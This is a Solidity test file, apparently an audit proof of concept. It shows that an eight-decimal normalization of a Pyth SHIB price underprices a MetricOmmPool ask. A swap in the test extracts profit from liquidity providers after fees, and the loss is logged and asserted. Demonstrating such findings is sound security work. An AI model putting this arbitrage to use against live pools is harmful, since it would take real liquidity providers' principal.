// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {MetricOmmPoolBaseTest, Q64} from "@metric-core-test/MetricOmmPool.base.t.sol";
import {FaithfulAnchorOracle, FaithfulAnchoredPriceProvider} from "@metric-core-test/mocks/FaithfulAnchor.sol";
import {MetricOmmPool} from "@metric-core/MetricOmmPool.sol";
import {MetricOmmPoolDeployer} from "@metric-core/MetricOmmPoolDeployer.sol";
import {PoolFeeConfig} from "@metric-core/types/FactoryStorage.sol";
import {BinState} from "@metric-core/types/PoolStorage.sol";
import {ExtensionOrders, PoolExtensions} from "@metric-core/types/PoolExtensionsConfig.sol";
import {MockERC20} from "@metric-core-test/mocks/MockERC20.sol";

/// @notice Carries the direct Pyth eight-decimal normalization error through real pool accounting.
/// @dev The companion smart-contracts-poc test proves that the 500 midpoint used here is produced
///      from a fresh, correctly signed Pyth price of 0.0000050099 with one-basis-point confidence.
contract PythDirectPricePrecisionPoolAuditTest is MetricOmmPoolBaseTest {
  bytes32 private constant SHIB_USD = bytes32(uint256(4));

  uint256 private constant STORED_MID8 = 500;
  uint256 private constant TRUE_PRICE_WAD = 5_009_900_000_000;
  uint16 private constant SPREAD_BPS = 1;
  uint16 private constant MAX_SPREAD_BPS = 150;
  uint256 private constant MIN_MARGIN = 5e13;

  uint256 private constant INITIAL_TOKEN0_PER_SHARE_E18 = 1e29;
  uint256 private constant INITIAL_TOKEN1_PER_SHARE_E18 = 1e18;
  uint104 private constant LP_SHARES = 10e18;
  uint24 private constant NOTIONAL_FEE_E8 = 50_000;
  uint256 private constant TOKEN0_SCALE = 1;
  uint256 private constant TOKEN1_SCALE = 1e12;

  FaithfulAnchorOracle private anchorOracle;
  FaithfulAnchoredPriceProvider private anchoredProvider;

  function inSwap() external view returns (address) {
    return address(anchoredProvider);
  }

  function setUp() public override {
    super.setUp();
    vm.warp(1_700_000_000);

    token0 = new MockERC20("Shiba Inu", "SHIB", 18);
    token1 = new MockERC20("USD Coin", "USDC", 6);

    anchorOracle = new FaithfulAnchorOracle();
    anchorOracle.setFeed(SHIB_USD, STORED_MID8, SPREAD_BPS, 0, block.timestamp);
    anchoredProvider = new FaithfulAnchoredPriceProvider(
      address(anchorOracle), SHIB_USD, bytes32(0), MIN_MARGIN, 60, MAX_SPREAD_BPS, address(token0), address(token1)
    );
    pool = _deployPrecisionPool();

    token0.mint(address(callers[1]), 2_000_000_000_000e18);
    token1.mint(address(callers[2]), 20_000_000e6);
    _approveUsersForPool(address(pool));

    // Ten shares seed one trillion SHIB, worth approximately $5.01 million.
    _addLiquidity(1, 0, 0, LP_SHARES, 0);
  }

  function test_normalizationErrorExtractsLpPrincipalAfterAllFees() public {
    (, uint128 askX64) = anchoredProvider.getBidAndAskPrice();
    uint256 truePriceX64 = Math.mulDiv(TRUE_PRICE_WAD, Q64, 1e18);
    uint256 askUnderpricingBps = Math.mulDiv(truePriceX64 - askX64, 10_000, truePriceX64);

    (uint104 t0Before, uint104 t1Before,,,) = _getBinState(0);
    uint256 valueBefore = _trueUsdcValueScaled(t0Before, t1Before);

    // Buy only 10% of inventory and leave 90% in the bin. This avoids an empty-bin
    // transition and requires roughly $0.5m rather than the previous $12.2m stress case.
    uint128 token0Requested = uint128(Math.mulDiv(uint256(t0Before), 10, 100 * TOKEN0_SCALE));
    (int256 amount0Delta, int256 amount1Delta) =
      _swap(2, users[2], false, _i128ExactOut(token0Requested), type(uint128).max);

    (uint104 t0After, uint104 t1After,,,) = _getBinState(0);
    uint256 valueAfter = _trueUsdcValueScaled(t0After, t1After);

    uint256 token0OutRaw = uint256(-amount0Delta);
    uint256 usdcPaidRaw = uint256(amount1Delta);
    uint256 outputTrueUsdcRaw = Math.mulDiv(token0OutRaw, TRUE_PRICE_WAD, 1e30);
    uint256 attackerProfitUsdcRaw = outputTrueUsdcRaw - usdcPaidRaw;
    uint256 lpLossScaled = valueBefore - valueAfter;
    uint256 attackerProfitBpsE4 = Math.mulDiv(attackerProfitUsdcRaw, 100_000_000, usdcPaidRaw);
    uint256 lpLossBpsE4 = Math.mulDiv(lpLossScaled, 100_000_000, valueBefore);

    emit log_named_decimal_uint("signed Pyth SHIB price", TRUE_PRICE_WAD, 18);
    emit log_named_decimal_uint("stored eight-decimal midpoint", Math.mulDiv(STORED_MID8, 1e18, 1e8), 18);
    emit log_named_decimal_uint("anchored ask", Math.mulDiv(askX64, 1e18, Q64), 18);
    emit log_named_uint("ask underpricing before notional fee (bps)", askUnderpricingBps);
    emit log_named_decimal_uint("SHIB bought", token0OutRaw, 18);
    emit log_named_decimal_uint("true USDC value bought", outputTrueUsdcRaw, 6);
    emit log_named_decimal_uint("USDC paid including 5 bps notional fee", usdcPaidRaw, 6);
    emit log_named_decimal_uint("attacker profit in USDC", attackerProfitUsdcRaw, 6);
    emit log_named_decimal_uint("attacker gross edge (bps)", attackerProfitBpsE4, 4);
    emit log_named_decimal_uint("LP principal loss in USDC", lpLossScaled, 18);
    emit log_named_decimal_uint("LP principal loss (bps)", lpLossBpsE4, 4);

    assertGe(askUnderpricingBps, 6, "anchored ask remains below the signed source price");
    assertGt(attackerProfitUsdcRaw, 10e6, "attacker profit must exceed $10 after all fees");
    assertGt(lpLossScaled * 10_000, valueBefore, "LP principal loss must exceed the 0.01% Medium threshold");
  }

  function _trueUsdcValueScaled(uint104 t0, uint104 t1) private pure returns (uint256) {
    return Math.mulDiv(uint256(t0), TRUE_PRICE_WAD, 1e18) + uint256(t1);
  }

  function _deployPrecisionPool() private returns (MetricOmmPool deployedPool) {
    (BinState[] memory nonNegative, BinState[] memory negative) = _defaultBinStateArrays();
    ExtensionOrders memory orders;
    PoolExtensions memory extensions;

    deployedPool = MetricOmmPool(
      poolDeployer.deploy(
        MetricOmmPoolDeployer.DeployParams({
          salt: keccak256("pyth-direct-price-precision"),
          factory: address(this),
          admin: admin,
          adminFeeDestination: adminFeeDestination,
          token0: address(token0),
          token1: address(token1),
          priceProvider: address(anchoredProvider),
          extensions: extensions,
          extensionOrders: orders,
          immutablePriceProvider: true,
          token0ScaleMultiplier: TOKEN0_SCALE,
          token1ScaleMultiplier: TOKEN1_SCALE,
          initialScaledAmount0PerShareE18: INITIAL_TOKEN0_PER_SHARE_E18,
          initialScaledAmount1PerShareE18: INITIAL_TOKEN1_PER_SHARE_E18,
          minimalMintableLiquidity: MINIMAL_MINTABLE_LIQUIDITY,
          spreadFeeE6: 0,
          curBinDistFromProvidedPriceE6: 0,
          nonNegativeBinStates: nonNegative,
          negativeBinStates: negative,
          notionalFeeE8: NOTIONAL_FEE_E8
        })
      )
    );

    priceProviderTimelock[address(deployedPool)] = type(uint256).max;
    poolAdmin[address(deployedPool)] = admin;
    poolFeeConfig[address(deployedPool)] = PoolFeeConfig({
      protocolSpreadFeeE6: 0,
      adminSpreadFeeE6: 0,
      protocolNotionalFeeE8: NOTIONAL_FEE_E8,
      adminNotionalFeeE8: 0
    });
    poolAdminFeeDestination[address(deployedPool)] = adminFeeDestination;
  }
}
